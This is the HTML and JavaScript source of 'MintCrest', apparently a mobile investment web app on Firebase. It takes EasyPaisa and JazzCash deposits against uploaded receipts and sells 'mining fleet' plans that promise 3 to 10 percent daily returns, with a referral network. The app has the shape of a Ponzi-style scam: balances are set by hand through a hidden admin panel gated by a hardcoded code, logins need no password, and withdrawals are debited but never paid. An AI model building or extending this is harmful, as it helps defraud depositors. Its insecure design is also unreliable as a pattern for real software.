<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest | Global Elite Vault</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap');
        body { font-family: 'Outfit', sans-serif; background: #000206; color: white; overflow-x: hidden; }
        .glass { background: rgba(255, 255, 255, 0.01); backdrop-filter: blur(20px); border: 1px solid rgba(255,255,255,0.06); border-radius: 2rem; }
        .page { display: none; animation: slideUp 0.3s ease-out; }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
        .nav-btn.active-tab { color: #3b82f6; border-top: 3px solid #3b82f6; }
        .gold-text { background: linear-gradient(to right, #bf953f, #fcf6ba, #b38728); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    </style>
</head>
<body class="h-screen flex flex-col">

    <section id="auth-ui" class="fixed inset-0 z-[9999] bg-[#000206] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-5xl font-black italic tracking-tighter mb-4 uppercase">MINT<span class="text-blue-500">CREST</span></h1>
            <div class="glass p-10 border-t-2 border-blue-600/30">
                <input type="text" id="user-name" placeholder="Username / ID" class="w-full bg-white/5 p-5 rounded-2xl mb-8 text-center font-bold outline-none border border-white/5 focus:border-blue-500">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95 shadow-2xl">Access Account</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        <div class="p-8 flex justify-between items-center">
            <div>
                <p class="text-[8px] text-gray-500 font-bold uppercase">Node Identity</p>
                <h2 class="text-xl font-black italic flex items-center gap-2">
                    <span id="u-display">--</span>
                    <span id="u-tick" class="hidden text-blue-500 text-sm">✅</span>
                </h2>
            </div>
            <div class="text-right">
                <p class="text-[8px] text-gray-500 font-bold uppercase">Current Rank</p>
                <span id="v-rank" class="text-[10px] font-black text-yellow-500 uppercase">Newbie</span>
            </div>
        </div>

        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 mb-6 bg-gradient-to-br from-blue-600/10 to-transparent border-l-4 border-blue-600">
                <p class="text-[9px] text-blue-400 font-black uppercase mb-1 tracking-widest">Available Liquidity</p>
                <h2 class="text-5xl font-black tracking-tighter mb-6" id="v-bal">₨ 0</h2>
                <div class="flex justify-between border-t border-white/5 pt-4">
                    <div><p class="text-[7px] text-gray-500 uppercase">Profit Wallet</p><p class="text-sm font-black text-green-500" id="v-profit">₨ 0</p></div>
                    <div class="text-right"><p class="text-[7px] text-gray-500 uppercase">Active Fleet</p><p class="text-sm font-black" id="v-tier">None</p></div>
                </div>
            </div>

            <div id="timer-box" class="hidden glass p-6 mb-6 text-center border border-yellow-500/10">
                <p class="text-[8px] font-bold text-yellow-500 uppercase mb-2">Next Profit Injection</p>
                <h3 id="cycle-clock" class="text-2xl font-black tracking-widest">00:00:00</h3>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('deposit')" class="glass p-8 text-center bg-blue-600/5">📥<br><span class="text-[10px] font-black uppercase mt-2 block">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-8 text-center bg-red-600/5">📤<br><span class="text-[10px] font-black uppercase mt-2 block">Withdraw</span></button>
            </div>

            <button onclick="changePage('invest')" class="w-full glass p-6 text-center border-dashed border-2 border-blue-500/20 mb-6">
                <span class="text-[10px] font-black uppercase tracking-widest gold-text">Upgrade Mining Fleet 🚀</span>
            </button>
        </div>

        <div id="p-more" class="page p-6 space-y-4">
            <div class="glass p-6 flex justify-between items-center" onclick="changePage('history')"><span>📜 Transaction Logs</span><span>➜</span></div>
            <div class="glass p-6 flex justify-between items-center" onclick="changePage('refer')"><span>👥 My Network</span><span>➜</span></div>
            
            <div class="glass p-8 border-t-4 border-yellow-500">
                <h3 class="text-center font-black uppercase text-[10px] mb-4">Promo Code</h3>
                <input type="text" id="promo-in" placeholder="Enter Code" class="w-full mb-4">
                <button onclick="applyPromo()" class="w-full bg-yellow-600 py-3 rounded-xl font-black text-[9px] uppercase">Redeem</button>
            </div>

            <a href="https://wa.me/yournumber" class="block glass p-6 text-center text-green-500 font-black uppercase text-[10px]">WhatsApp Support 💬</a>
            <button onclick="logout()" class="w-full text-red-500 font-bold text-xs">Terminate Session</button>
        </div>

        <div id="p-history" class="page p-6"><div id="hist-list" class="space-y-3"></div></div>
        <div id="p-refer" class="page p-6 text-center">
            <div class="glass p-10">
                <h2 class="font-black mb-4">Invite Partners</h2>
                <p id="ref-url" class="text-[8px] opacity-40 mb-6">--</p>
                <button onclick="copyRef()" class="bg-blue-600 px-10 py-4 rounded-2xl font-black text-[10px]">COPY LINK</button>
            </div>
        </div>

        <div id="p-invest" class="page p-6"><div id="plans-grid" class="space-y-3"></div></div>
        
        <div id="p-deposit" class="page p-6">
            <div class="glass p-8">
                <h3 class="text-center font-black mb-6">Add Capital</h3>
                <select id="dep-m" class="w-full mb-4"><option>EasyPaisa (03xx-xxxxxxx)</option><option>JazzCash (03xx-xxxxxxx)</option></select>
                <input type="number" id="dep-a" placeholder="Amount" class="w-full mb-4">
                <label class="block w-full bg-white/5 p-4 rounded-xl border-2 border-dashed border-white/10 text-center cursor-pointer mb-6">
                    <span id="f-lab" class="text-[9px] font-bold opacity-40 uppercase">Upload Receipt</span>
                    <input type="file" id="dep-f" class="hidden" onchange="document.getElementById('f-lab').innerText='Image Attached ✅'">
                </label>
                <button onclick="submitDep()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[10px]">VERIFY DEPOSIT</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-8">
                <h3 class="text-center font-black mb-6">Payout</h3>
                <input type="number" id="wd-a" placeholder="Amount" class="w-full mb-4">
                <input type="text" id="wd-acc" placeholder="Account Details" class="w-full mb-8">
                <button onclick="submitWd()" class="w-full bg-red-600 py-5 rounded-2xl font-black text-[10px]">REQUEST WITHDRAW</button>
            </div>
        </div>
    </main>

    <nav id="bottom-nav" class="hidden glass fixed bottom-0 left-0 w-full p-8 flex justify-around items-center z-[500] bg-black/90">
        <button onclick="changePage('home')" id="n-home" class="nav-btn active-tab text-2xl">🏛️</button>
        <button onclick="changePage('invest')" id="n-invest" class="nav-btn text-2xl">📈</button>
        <button onclick="changePage('more')" id="n-more" class="nav-btn text-2xl">⚙️</button>
    </nav>

    <div id="admin-panel" class="fixed inset-0 bg-black z-[10000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-6">
            <h2 class="text-xl font-black text-blue-500 uppercase">Master Admin</h2>
            <button onclick="closeAdmin()" class="bg-red-500 px-4 py-1 rounded">EXIT</button>
        </div>
        <div id="adm-stats" class="glass p-4 mb-6 grid grid-cols-2 text-[10px] font-bold">
            <div id="total-u">Users: 0</div><div id="total-d">Deposits: 0</div>
        </div>
        <div id="adm-req-list" class="space-y-4"></div>
    </main>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        let user = null; let tapCount = 0;

        const plans = [{n:"Trial", p:200, r:3}, {n:"Bronze", p:500, r:3.5}, {n:"Silver", p:1000, r:4}, {n:"Gold", p:3000, r:5}, {n:"Platinum", p:5000, r:6}, {n:"Diamond", p:10000, r:10}];

        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            if(!doc.exists) await ref.set({ name: name, balance: 0, profit: 0, lastReq: 0, tierName: "Inactive", verified: false, banned: false, rank: "Newbie" });
            if(doc.exists && doc.data().banned) return alert("BANNED!");
            localStorage.setItem('mc_user', name);
            document.getElementById('u-display').innerText = name;
            document.getElementById('ref-url').innerText = `https://mintcrest.gold/?ref=${name}`;
            startSync(name);
            document.getElementById('auth-ui').classList.add('hidden');
            document.getElementById('app-ui').classList.remove('hidden');
            document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans();
        }

        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => {
                if(doc.exists) { 
                    user = doc.data();
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance||0).toLocaleString();
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit||0).toLocaleString();
                    document.getElementById('v-tier').innerText = user.tierName;
                    document.getElementById('v-rank').innerText = user.rank;
                    if(user.verified) document.getElementById('u-tick').classList.remove('hidden');
                    updateTimer();
                }
            });
            db.collection("requests").where("user","==",name).orderBy("time","desc").limit(10).onSnapshot(s => {
                const l = document.getElementById('hist-list'); l.innerHTML = '';
                s.forEach(d => { const r = d.data(); l.innerHTML += `<div class="glass p-4 text-[9px] flex justify-between uppercase"><div>${r.type}</div><div class="${r.status==='pending'?'text-yellow-500':'text-green-500'}">₨ ${r.amount} - ${r.status}</div></div>`; });
            });
        }

        function updateTimer() {
            if(user.lastReq > 0) {
                document.getElementById('timer-box').classList.remove('hidden');
                const run = () => {
                    const diff = (user.lastReq + 86400000) - Date.now();
                    if(diff > 0) { document.getElementById('cycle-clock').innerText = new Date(diff).toISOString().substr(11, 8); requestAnimationFrame(run); }
                    else { document.getElementById('cycle-clock').innerText = "INJECTION READY"; }
                }; run();
            }
        }

        function renderPlans() {
            const g = document.getElementById('plans-grid'); g.innerHTML = '';
            plans.forEach(p => { g.innerHTML += `<div onclick="buyP(${p.p},'${p.n}')" class="glass p-6 flex justify-between items-center active:scale-95"><div><h4 class="font-black text-[10px] uppercase">${p.n} Fleet</h4><p class="text-[8px] text-green-500 font-bold">${p.r}% Daily</p></div><div class="font-black">₨ ${p.p}</div></div>`; });
        }

        async function buyP(p, n) {
            if(user.balance < p) return alert("Low Balance!");
            await db.collection("users").doc(user.name).update({ balance: user.balance - p, tierName: n, lastReq: Date.now() });
            alert("Fleet Active! 😘"); changePage('home');
        }

        async function submitDep() {
            const a = document.getElementById('dep-a').value; const f = document.getElementById('dep-f').files[0];
            if(!a || !f) return alert("Fill all fields!");
            const r = new FileReader(); r.readAsDataURL(f);
            r.onload = async () => {
                await db.collection("requests").add({ user: user.name, type: "deposit", amount: parseInt(a), proof: r.result, status: "pending", time: Date.now() });
                alert("Deposit Logged! ❤️"); location.reload();
            };
        }

        async function submitWd() {
            const a = document.getElementById('wd-a').value; if(a > user.balance) return alert("Insufficient!");
            await db.collection("requests").add({ user: user.name, type: "withdraw", amount: parseInt(a), status: "pending", time: Date.now() });
            await db.collection("users").doc(user.name).update({ balance: user.balance - parseInt(a) });
            alert("Extraction Requested!"); location.reload();
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(document.getElementById('n-'+p)) document.getElementById('n-'+p).classList.add('active-tab'); }
        function copyRef() { navigator.clipboard.writeText(document.getElementById('ref-url').innerText); alert("Copied!"); }
        
        // Admin
        function adminTap() { tapCount++; if(tapCount>=4) { if(prompt("Access Code:")==="mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdm(); } tapCount=0; } }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
        async function syncAdm() {
            db.collection("requests").where("status","==","pending").onSnapshot(s => {
                const l = document.getElementById('adm-req-list'); l.innerHTML = '';
                s.forEach(doc => { const d = doc.data(); l.innerHTML += `<div class="glass p-5 text-[9px] uppercase">${d.user} | ${d.type} | Rs ${d.amount}<div class="flex gap-2 mt-4">${d.proof ? `<button onclick="window.open().document.write('<img src=\\'${d.proof}\\' style=\\'width:100%\\' />')" class="bg-gray-700 px-3 py-1 rounded">PROOF</button>` : ''}<button onclick="hAdm('${doc.id}','${d.user}',${d.amount},'approved','${d.type}')" class="bg-green-600 px-3 py-1 rounded">OK</button></div></div>`; });
            });
            const uS = await db.collection("users").get(); document.getElementById('total-u').innerText = "Users: " + uS.size;
        }
        async function hAdm(id, u, amt, act, type) {
            const ref = db.collection("users").doc(u); const d = await ref.get();
            if(act==='approved' && type==='deposit') await ref.update({ balance: (d.data().balance||0)+amt });
            await db.collection("requests").doc(id).update({ status: act }); alert("Done!");
        }
        function logout() { localStorage.removeItem('mc_user'); location.reload(); }
        window.onload = () => { if(localStorage.getItem('mc_user')) { login(); } };
    </script>
</body>
</html>
